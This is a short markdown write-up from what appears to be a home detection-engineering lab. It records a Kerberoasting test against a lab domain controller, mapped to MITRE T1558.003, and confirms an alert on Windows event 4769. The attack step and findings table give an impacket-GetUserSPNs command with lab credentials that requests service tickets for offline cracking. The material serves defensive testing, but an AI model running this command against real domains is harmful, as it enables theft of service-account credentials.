# 10 — Kerberoasting

## Overview

| Field           | Detail                                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------------------ |
| Status          | ✅ Completed                                                                                                  |
| Date            | 25 June 2026                                                                                                 |
| Tier            | Intermediate                                                                                                 |
| Attacker        | kali-linux-attacker-vm (10.0.10.3)                                                                           |
| Target          | win-dc (10.0.10.10)                                                                                          |
| MITRE Tactic    | Credential Access                                                                                            |
| MITRE Technique | [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) |
| Tool            | impacket GetUserSPNs                                                                                         |
| Log Source      | Windows Security Event 4769                                                                                  |
| Detection       | [detection/10-kerberoasting.md](../../detection/10-kerberoasting.md)                                         |

---

## Attack Steps

```bash
# From Kali, request service tickets for cracking (svc-sql created in setup 05):
impacket-GetUserSPNs 200teamok.local/jsmith:Passw0rd123! -dc-ip 10.0.10.10 -request
```

---

## Detection (summary)

Full SPL, alert settings, and notes are in the [detection file](../../detection/10-kerberoasting.md).

---

## Findings


| Field           | Result                                                                              |
| --------------- | ----------------------------------------------------------------------------------- |
| Date            | 25 June 2026                                                                        |
| Command used    | impacket-GetUserSPNs 200teamok.local/jsmith:Passw0rd123! -dc-ip 10.0.10.10 -request |
| Events captured | EventCode=4769                                                                      |
| Alert triggered | Yes                                                                                 |

---

## Screenshots

![](vscode-userdata:/User/caches/remote-clipboard/5fa6688f-4896-4f6b-890d-832667e91e31/9be4438a-fa5d-4bd8-9a45-15f8ba5909fc/1-RC4%20not%20enable%20on%20DC.png) ![](vscode-userdata:/User/caches/remote-clipboard/5fa6688f-4896-4f6b-890d-832667e91e31/b4bd7b11-6d0c-42d3-8950-027b7e219be2/2-turn%20ok%20week%20encryptio%20on%20dc.png) ![](vscode-userdata:/User/caches/remote-clipboard/5fa6688f-4896-4f6b-890d-832667e91e31/43c2ad4a-ca2c-4e7c-9611-2785b2f9b128/3-found%20hashes.png) ![](vscode-userdata:/User/caches/remote-clipboard/5fa6688f-4896-4f6b-890d-832667e91e31/6f727054-3ad6-4070-b531-4a8d7c625d06/4-eventid%3D4769.png) ![](vscode-userdata:/User/caches/remote-clipboard/5fa6688f-4896-4f6b-890d-832667e91e31/d0963469-efa8-4825-a56c-3197d2a04986/5-create-alert.png) ![](vscode-userdata:/User/caches/remote-clipboard/5fa6688f-4896-4f6b-890d-832667e91e31/de83354d-9114-4e42-a197-86c1c51cb732/6-alert-trigered.png)
